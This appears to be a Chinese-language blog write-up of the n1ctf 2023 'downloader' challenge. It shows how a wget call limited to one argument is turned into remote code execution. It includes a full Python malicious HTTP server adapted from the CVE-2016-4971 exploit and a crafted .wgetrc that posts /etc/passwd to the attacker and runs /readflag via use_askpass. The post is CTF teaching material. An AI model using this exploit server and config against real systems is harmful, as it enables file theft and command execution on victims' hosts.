---
layout: post
title: "wget只能有一个参数? 给你rce了"
---

*题目源自于2023年的n1ctf, 名为downloader*

~~~老鱼我没爆零~~~

## 步骤
从题目可以看出, 程序使用了wget下载文件, 但是并不会给予任何回显
```c
          iVar2 = open("/dev/null",0x41,0x1b6);
          dup2(iVar2,1);
          dup2(iVar2,2);
          execlp("wget","wget",auStack_128,0);
```

初步计划写入`/etc/cron.d`以达到rce目的, 但是execlp仅接收1个参数作为函数参数, 其man内容如下

>    l - execl(), execlp(), execle()
>       The const char *arg and subsequent ellipses can be thought of as arg0, arg1, ..., argn.  Together they describe a list of  one  or  more  pointers  to  null-terminated
>       strings  that  represent the argument list available to the executed program.  The first argument, by convention, should point to the filename associated with the file
>       being executed.  The list of arguments must be terminated by a null pointer, and, since these are variadic functions, this pointer must be cast (char *) NULL.
>       By contrast with the 'l' functions, the 'v' functions (below) specify the command-line arguments of the executed program as a vector.

但参数于第四个直接被截断, 于是理解为只能给wget传入一个参数, 可构成ssrf (但事后证明好像没啥用233)

在搜寻过程中, 发现了个古代漏洞: [CVE-2016-4971](https://nvd.nist.gov/vuln/detail/CVE-2016-4971), 以此获得灵感, 可通过控制`.wgetrc`以达成rce的目的

不幸的是, 靶机的有问题的程序的权限很低, 无法写入cron表达成rce目的, 同时也无人登录靶机, 故搜寻到`--use-askpass`参数 ([文档](https://github.com/mirror/wget/blob/9a35fe609c87c558153cff80fef7dea809b3cf63/doc/wget.texi#L1197-L1204))

在wget用到`--use-askpass`参数之前, wget需要遇到一次401错误以迫使其登录, 否则其头部不存在`Authorization`参数, 无法通过其进行命令执行

同时`--use-askpass`会直接使用其`stdout`的输出作为用户名和参数, 配合自定义的恶意服务端可直接泄漏出需要的东西, 而这里是flag

遂决定利用`.wgetrc`中`input = baka.txt`来省去url, 但很不幸, wget在有input的情况下完全绕过了`--use-askpass`的参数

苦苦在官方手册搜寻无果, 但最终还是从源码内的文档中注意到有如下几行:
```
You can set the default command for use-askpass in the @file{.wgetrc}.  That
setting may be overridden from the command line.
```

于是决定盲写一个
```
use_askpass=/readflag
```

  亡
  口
月贝凡

## 利用代码

其自建的恶意服务端如下
```python
#!/usr/bin/env python

#
# Wget 1.18 < Arbitrary File Upload Exploit
# Dawid Golunski
# dawid( at )legalhackers.com
#
# http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt
#
# CVE-2016-4971
#
HTTP_LISTEN_IP = '0.0.0.0'
HTTP_LISTEN_PORT = 23360

import http.server
import socketserver
import socket;

class wgetExploit(http.server.SimpleHTTPRequestHandler):
   def do_AUTHHEAD(self):
       self.send_response(401)
       self.send_header("WWW-Authenticate", 'Basic realm="Test"')
       self.end_headers()
   def do_GET(self):
       # This takes care of sending .wgetrc
       print(("We have a volunteer requesting " + self.path + " by GET :)\n"))

       print("Uploading .wgetrc via ftp redirect vuln. It should land in /root \n")
       self.send_response(200)
       self.end_headers()
       with open(".wgetrc", "r") as f:
           self.wfile.write(bytes(f.read(), 'utf8'))
           self.__staged = True

   def do_POST(self):
       if self.headers.get("Authorization") is None:
           self.do_AUTHHEAD()
           self.wfile.write(b"qwq")
           return
       print(self.headers.get("Authorization"))
       # In here we will receive extracted file and install a PoC cronjob
       print(("We have a volunteer requesting " + self.path + " by POST :)\n"))

       content_len = int(self.headers.get('content-length', 0))
       post_body = self.rfile.read(content_len)
       print(("Received POST from wget, this should be the extracted /etc/shadow file: \n\n---[begin]---\n %s \n---[eof]---\n\n" % (post_body)))

       print("Sending back a cronjob script as a thank-you for the file...")
       print("It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)")
       self.send_response(200)
       self.end_headers()
       with open("a.out", "rb") as f:
           self.wfile.write(f.read())

       print("\nFile was served. Check on /root/hacked-via-wget on the victim's host in a minute! :) \n")

       return


handler = socketserver.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)

print("Ready? Is your FTP server running?")

print(("Serving wget exploit on port %s...\n\n" % HTTP_LISTEN_PORT))

handler.serve_forever()
```

最终的wgetrc为下
```
post_file = /etc/passwd
use_askpass=/readflag
```

